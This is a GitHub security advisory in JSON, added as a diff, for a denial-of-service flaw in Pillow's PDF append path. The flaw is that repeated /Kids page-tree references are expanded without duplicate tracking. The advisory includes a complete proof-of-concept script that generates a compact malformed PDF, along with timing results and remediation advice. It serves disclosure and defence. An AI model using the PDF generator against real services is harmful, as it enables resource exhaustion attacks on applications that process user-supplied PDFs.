@@ -1,0 +1,112 @@
+{
+  "id": "GHSA-mrfp-p49p-3hf2",
+  "modified": "2026-10-22T16:15:49.299882714Z",
+  "published": "2026-10-22T16:00:47Z",
+  "aliases": [
+    "CVE-2026-96640"
+  ],
+  "summary": "Pillow PDF append accepts malformed shared page-tree DAG causing resource exhaustion",
+  "details": "### Summary\nPillow's documented PDF append path can spend disproportionate CPU time on a compact malformed PDF page tree.\n\nAn attacker who can supply an existing PDF to an application that appends an image with `Image.save(..., format=\"PDF\", append=True)` can provide a malformed `/Pages` tree where each level repeats the same child `/Pages` reference in `/Kids`. Pillow treats the graph as a tree and expands each repeated reference in `PdfParser.linearize_page_tree()` without tracking visited or duplicate indirect references.\n\nIn the bounded proof below, a `1410`-byte PDF expands to `8192` page references from one distinct page object and takes about `9.6` seconds through the append path. A comparable linear control with the same depth stays at one page reference and completes in about `0.02` seconds.\n\nThis is in scope for Pillow's security policy because it is reproducible in `main`, affects the latest public release tested (`12.3.0`), and is not just an unexpected Python exception. The vulnerable operation accepts attacker-controlled PDF bytes through Pillow's PDF parser and causes deterministic resource consumption before normal completion.\n\n### Details\n\n#### Affected versions\n\n- Package: `Pillow`\n- Ecosystem: `pip` / PyPI\n- Affected component: `src/PIL/PdfParser.py` page-tree traversal reached from `src/PIL/PdfImagePlugin.py` PDF append handling\n- Runtime-tested affected release: `12.3.0`\n- Runtime-tested affected development version: `13.0.0.dev0`\n- Tested commit: `b39b9649312fbc381060e8c7c7f9f0de4cc63daa`\n- Current source artifact hash: `sha256(git archive --format=tar HEAD) = 2ccefca23d432456765be8d3c34564c65ba016b0c9da1e44ca389762f7eda054`\n- Release `12.3.0` commit: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`\n- Release `12.3.0` source artifact hash: `sha256(git archive --format=tar 12.3.0) = 94bed33fd20123938dbc0153d295250bb4e3c09251b6d4a34f7595e25d409c81`\n- Source-level affected: `5.1.0`, `12.2.0`, `12.3.0`, and `HEAD`\n- Likely affected range: `\u003e= 5.1.0`\n- Patched versions: none known\n\nEvidence fact strings:\n\n- Runtime-tested affected: 12.3.0\n- Runtime-tested affected: 13.0.0.dev0 at b39b9649312fbc381060e8c7c7f9f0de4cc63daa\n- Source-level affected: 5.1.0\n- Source-level affected: 12.2.0\n- Source-level affected: HEAD\n- Likely affected range: \u003e= 5.1.0, no fixed version known\n- Pre-boundary note: 5.0.0 has PdfImagePlugin.py but no src/PIL/PdfParser.py\n\n`5.0.0` contains `src/PIL/PdfImagePlugin.py` but does not contain `src/PIL/PdfParser.py`. `PdfParser.py` was introduced by `6207b44ab1ff4a91d8ddc7579619876d0bb191a4` (`2018-01-18 issue #2959: support appending to existing PDFs`), which shipped in `5.1.0`.\n\n#### Technical details\n\nThe reachable path is:\n\n1. A service or application receives an attacker-influenced existing PDF and appends an image using Pillow's public PDF save path:\n\n   ```python\n   Image.new(\"L\", (1, 1), 0).save(existing_pdf_file, format=\"PDF\", append=True)\n   ```\n\n2. `src/PIL/PdfImagePlugin.py` routes `append=True` to `PdfParser`:\n\n   ```python\n   is_appending = im.encoderinfo.get(\"append\", False)\n   filename_str = filename.decode() if isinstance(filename, bytes) else filename\n   if is_appending:\n       existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode=\"r+b\")\n   else:\n       existing_pdf = PdfParser.PdfParser(f=fp, filename=filename_str, mode=\"w+b\")\n   ```\n\n3. `src/PIL/PdfParser.py` parses the existing PDF and linearizes the page tree:\n\n   ```python\n   self.page_tree_root = self.read_indirect(self.pages_ref)\n   self.pages = self.linearize_page_tree(self.page_tree_root)\n   self.orig_pages = self.pages[:]\n   ```\n\n4. `linearize_page_tree()` recursively follows every `/Kids` entry and extends the page list. It does not track page-tree node identity, duplicate references, or active traversal references:\n\n   ```python\n   def linearize_page_tree(\n       self, node: PdfDict | None = None\n   ) -\u003e list[IndirectReference]:\n       page_node = node if node is not None else self.page_tree_root\n       check_format_condition(\n           page_node[b\"Type\"] == b\"Pages\", \"/Type of page tree node is not /Pages\"\n       )\n       pages = []\n       for kid in page_node[b\"Kids\"]:\n           kid_object = self.read_indirect(kid)\n           if kid_object[b\"Type\"] == b\"Page\":\n               pages.append(kid)\n           else:\n               pages.extend(self.linearize_page_tree(node=kid_object))\n       return pages\n   ```\n\n5. During append, `rewrite_pages()` then iterates the expanded `orig_pages` list and scans/replaces entries in `self.pages`, adding more cost to the already expanded duplicate-reference list.\n\nThe missing invariant is:\n\n```text\nThe PDF page tree should be treated as an acyclic tree of unique indirect references before Pillow builds pages/orig_pages or rewrites pages.\n```\n\nThe proof intentionally uses a malformed PDF page-tree DAG: each `/Pages` node repeats the same next `/Pages` child reference twice. Pillow accepts this graph and expands it as if the repeated reference represented distinct subtrees.\n\n### PoC\n\nEnvironment used for validation:\n\n- OS/runtime: Linux, Python `3.13.11`\n- Current tested build: Pillow `13.0.0.dev0`, commit `b39b9649312fbc381060e8c7c7f9f0de4cc63daa`\n- Latest release tested: Pillow `12.3.0`\n- The proof uses only synthetic in-memory PDFs and does not contact the network.\n\nSave this as `poc_pillow_pdf_page_tree_dag.py`:\n\n```python\n#!/usr/bin/env python3\nfrom __future__ import annotations\n\nimport io\nimport json\nimport sys\nimport time\n\nfrom PIL import Image, PdfParser\nimport PIL\n\n\ndef make_page_tree_pdf(depth: int, fanout: int) -\u003e bytes:\n    if fanout not in (1, 2):\n        raise ValueError(\"fanout must be 1 or 2\")\n\n    objects: list[bytes] = [b\"\u003c\u003c /Type /Catalog /Pages 2 0 R \u003e\u003e\"]\n    for object_id in range(2, depth + 3):\n        next_id = object_id + 1\n        kids = b\" \".join(f\"{next_id} 0 R\".encode(\"ascii\") for _ in range(fanout))\n        parent = b\"\" if object_id == 2 else f\" /Parent {object_id - 1} 0 R\".encode()\n        objects.append(b\"\u003c\u003c /Type /Pages /Kids [ \" + kids + b\" ]\" + parent + b\" \u003e\u003e\")\n    objects.append(f\"\u003c\u003c /Type /Page /Parent {depth + 2} 0 R \u003e\u003e\".encode(\"ascii\"))\n\n    result = bytearray(b\"%PDF-1.4\\n\")\n    offsets = [0]\n    for object_id, value in enumerate(objects, start=1):\n        offsets.append(len(result))\n        result.extend(f\"{object_id} 0 obj\\n\".encode(\"ascii\"))\n        result.extend(value)\n        result.extend(b\"\\nendobj\\n\")\n\n    xref_offset = len(result)\n    result.extend(f\"xref\\n0 {len(objects) + 1}\\n\".encode(\"ascii\"))\n    result.extend(b\"0000000000 65535 f \\n\")\n    for offset in offsets[1:]:\n        result.extend(f\"{offset:010d} 00000 n \\n\".encode(\"ascii\"))\n    result.extend(\n        f\"trailer\\n\u003c\u003c /Size {len(objects) + 1} /Root 1 0 R \u003e\u003e\\n\"\n        f\"startxref\\n{xref_offset}\\n%%EOF\\n\".encode(\"ascii\")\n    )\n    return bytes(result)\n\n\ndef run_case(depth: int, fanout: int) -\u003e dict[str, object]:\n    payload = make_page_tree_pdf(depth, fanout)\n    expected_refs = fanout ** (depth + 1)\n\n    start = time.monotonic()\n    with PdfParser.PdfParser(buf=payload) as pdf:\n        observed_refs = len(pdf.pages)\n        distinct_refs = len(set(pdf.pages))\n    parse_seconds = time.monotonic() - start\n\n    output = io.BytesIO(payload)\n    start = time.monotonic()\n    Image.new(\"L\", (1, 1), 0).save(output, format=\"PDF\", append=True)\n    append_seconds = time.monotonic() - start\n\n    return {\n        \"fanout\": fanout,\n        \"depth\": depth,\n        \"input_bytes\": len(payload),\n        \"expected_refs\": expected_refs,\n        \"observed_refs\": observed_refs,\n        \"distinct_refs\": distinct_refs,\n        \"parse_seconds\": round(parse_seconds, 6),\n        \"append_seconds\": round(append_seconds, 6),\n        \"output_bytes_after_append\": len(output.getvalue()),\n    }\n\n\ndef main() -\u003e int:\n    depth = int(sys.argv[1]) if len(sys.argv) \u003e 1 else 12\n    if not 0 \u003c= depth \u003c= 16:\n        raise SystemExit(\"depth must be between 0 and 16\")\n\n    linear = run_case(depth, fanout=1)\n    shared_dag = run_case(depth, fanout=2)\n\n    checks = {\n        \"linear_control_stays_one_page\": linear[\"observed_refs\"] == 1,\n        \"candidate_expands_to_expected_duplicate_refs\": shared_dag[\"observed_refs\"]\n        == shared_dag[\"expected_refs\"],\n        \"candidate_has_one_distinct_page_ref\": shared_dag[\"distinct_refs\"] == 1,\n        \"candidate_input_is_compact\": shared_dag[\"input_bytes\"] \u003c= 2048,\n        \"append_path_processed_both_inputs\": linear[\"output_bytes_after_append\"]\n        \u003e linear[\"input_bytes\"]\n        and shared_dag[\"output_bytes_after_append\"] \u003e shared_dag[\"input_bytes\"],\n    }\n    result = {\n        \"pillow_version\": PIL.__version__,\n        \"pillow_file\": PIL.__file__,\n        \"depth\": depth,\n        \"linear_control\": linear,\n        \"shared_dag_candidate\": shared_dag,\n        \"checks\": checks,\n        \"overall_passed\": all(checks.values()),\n    }\n    print(json.dumps(result, indent=2, sort_keys=True))\n    return 0 if result[\"overall_passed\"] else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())\n```\n\nRun:\n\n```bash\npython3 poc_pillow_pdf_page_tree_dag.py\n```\n\nExpected result:\n\n```text\n\"overall_passed\": true\n\"linear_control\": observed_refs == 1\n\"shared_dag_candidate\": input_bytes == 1410\n\"shared_dag_candidate\": observed_refs == 8192\n\"shared_dag_candidate\": distinct_refs == 1\n```\n\nObserved on current `main` / `13.0.0.dev0`:\n\n```text\n1410-byte input -\u003e 8192 observed page refs -\u003e 9.563007s append\n```\n\nObserved on Pillow `12.3.0`:\n\n```text\nPillow 12.3.0: 1410-byte input -\u003e 8192 observed page refs -\u003e 9.670602s append\n```\n\nFor comparison, the linear control in the same harness uses a comparable-depth page tree with `fanout=1`; it produces one page reference and completed append in about `0.016` to `0.028` seconds in my validation runs.\n\n### Impact\n\nThis is an availability issue in Pillow's PDF append handling. Applications are impacted if untrusted users can supply an existing PDF that the application later appends to, watermarks, or exports using Pillow's `Image.save(..., format=\"PDF\", append=True)` route.\n\nThe demonstrated primitive is deterministic CPU/resource amplification from compact attacker-controlled PDF bytes. The proof does not demonstrate confidentiality impact, integrity impact, memory corruption, filesystem access, network access, or impact through ordinary `Image.open()`.\n\nRequires attacker-influenced existing PDF processed by Pillow's documented PDF append path; not ordinary Image.open().\n\nThis should not be treated as just an unexpected Python exception. In the tested affected builds, the malformed PDF is accepted and processed to normal completion after the expensive expansion.\n\n### Remediation\n\nReject duplicate and cyclic page-tree references before constructing `self.pages` and `self.orig_pages`.\n\nOne possible fix is to pass traversal state through `linearize_page_tree()`:\n\n- Track active `/Pages` references to reject cycles.\n- Track seen page-tree and page indirect references to reject duplicate references.\n- Raise `PdfFormatError` when the page tree is not an acyclic tree of unique indirect references.\n\nSuggested regression tests:\n\n- A small PDF whose `/Kids` array repeats the same child `/Pages` reference should raise `PdfFormatError` quickly when used through `Image.save(..., format=\"PDF\", append=True)`.\n- A normal nested linear page tree should continue to append successfully.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pillow",
+        "purl": "pkg:pypi/pillow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.1.0"
+            },
+            {
+              "fixed": "13.0.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "10.0.0",
+        "10.0.1",
+        "10.1.0",
+        "10.2.0",
+        "10.3.0",
+        "10.4.0",
+        "11.0.0",
+        "11.1.0",
+        "11.2.1",
+        "11.3.0",
+        "12.0.0",
+        "12.1.0",
+        "12.1.1",
+        "12.2.0",
+        "12.3.0",
+        "5.1.0",
+        "5.2.0",
+        "5.3.0",
+        "5.4.0",
+        "5.4.0.dev0",
+        "5.4.1",
+        "6.0.0",
+        "6.1.0",
+        "6.2.0",
+        "6.2.1",
+        "6.2.2",
+        "7.0.0",
+        "7.1.0",
+        "7.1.1",
+        "7.1.2",
+        "7.2.0",
+        "8.0.0",
+        "8.0.1",
+        "8.1.0",
+        "8.1.1",
+        "8.1.2",
+        "8.2.0",
+        "8.3.0",
+        "8.3.1",
+        "8.3.2",
+        "8.4.0",
+        "9.0.0",
+        "9.0.1",
+        "9.1.0",
+        "9.1.1",
+        "9.2.0",
+        "9.3.0",
+        "9.4.0",
+        "9.5.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-mrfp-p49p-3hf2/GHSA-mrfp-p49p-3hf2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/security/advisories/GHSA-mrfp-p49p-3hf2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96640"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/pull/10093"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/commit/6f0e7ee1f9c2fe227906f8a4b926e6622b702bc7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/python-pillow/Pillow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/python-pillow/Pillow/releases/tag/13.0.0"
+    }
+  ]
+}
